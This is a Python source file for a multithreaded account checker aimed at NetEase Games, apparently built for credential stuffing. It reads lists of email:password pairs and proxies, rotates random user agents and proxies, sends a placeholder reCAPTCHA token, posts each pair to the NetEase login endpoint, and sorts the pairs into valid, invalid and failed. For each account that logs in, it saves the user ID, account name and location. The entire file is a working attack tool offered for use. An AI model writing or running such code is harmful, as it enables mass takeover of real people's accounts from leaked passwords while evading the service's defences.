import hashlib
import requests
import json
import random
import threading
from fake_useragent import UserAgent

class NeteaseChecker:
    def __init__(self, accounts, proxies=None, callback=None, task_id=None):
        self.accounts = accounts  # list of "email:password"
        self.proxies = proxies or []  # list of "ip:port"
        self.callback = callback  # function to update stats
        self.task_id = task_id
        self.session = requests.Session()
        self.ua = UserAgent()
        self.results = {'success': [], 'failed': [], 'invalid': [], 'errors': []}
        self.stats = {'success': 0, 'failed': 0, 'invalid': 0, 'errors': 0}
        self.lock = threading.Lock()

    def get_md5(self, pwd):
        return hashlib.md5(pwd.encode()).hexdigest()

    def get_random_ua(self):
        return self.ua.random

    def get_random_proxy(self):
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def check_one(self, account_data):
        try:
            email, password = account_data.strip().split(':', 1)
            md5_pwd = self.get_md5(password)
            proxy = self.get_random_proxy()
            headers = {
                "User-Agent": self.get_random_ua(),
                "recaptcha-token": "test",
                "Pragma": "no-cache",
                "Accept": "*/*"
            }
            login_data = {
                "account": email,
                "hash_password": md5_pwd,
                "client_id": "official",
                "response_type": "cookie",
                "redirect_uri": "https://account.neteasegames.com/account/home?lang=en_US",
                "state": "official_state"
            }
            r = self.session.post(
                "https://account.neteasegames.com/oauth/v2/email/login?lang=en_US",
                data=login_data,
                headers=headers,
                timeout=10,
                proxies=proxy
            )
            response = r.json()

            if response.get('code') == 1006:
                with self.lock:
                    self.stats['invalid'] += 1
                    self.results['invalid'].append(f"{email}:{password}")
                return

            if "Account does not exist" in r.text:
                with self.lock:
                    self.stats['failed'] += 1
                    self.results['failed'].append(f"{email}:{password}")
                return

            if response.get('code') == 0:
                # get user info
                info_headers = {"User-Agent": self.get_random_ua(), "Pragma": "no-cache"}
                info = self.session.get(
                    "https://account.neteasegames.com/ucenter/user/info?lang=en_US",
                    headers=info_headers,
                    timeout=10,
                    proxies=proxy
                ).json()
                user_id = info['user']['user_id']
                name = info['user']['account_name']
                location = info['user']['location']
                with self.lock:
                    self.stats['success'] += 1
                    self.results['success'].append(f"{email}:{password} | ID:{user_id} Name:{name} Location:{location}")
            else:
                with self.lock:
                    self.stats['failed'] += 1
                    self.results['failed'].append(f"{email}:{password}")

        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
                self.results['errors'].append(f"{account_data} - {str(e)}")

        finally:
            if self.callback:
                self.callback(self.task_id, self.stats)

    def run(self, workers=10):
        # use ThreadPoolExecutor
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            executor.map(self.check_one, self.accounts)
        return self.stats, self.results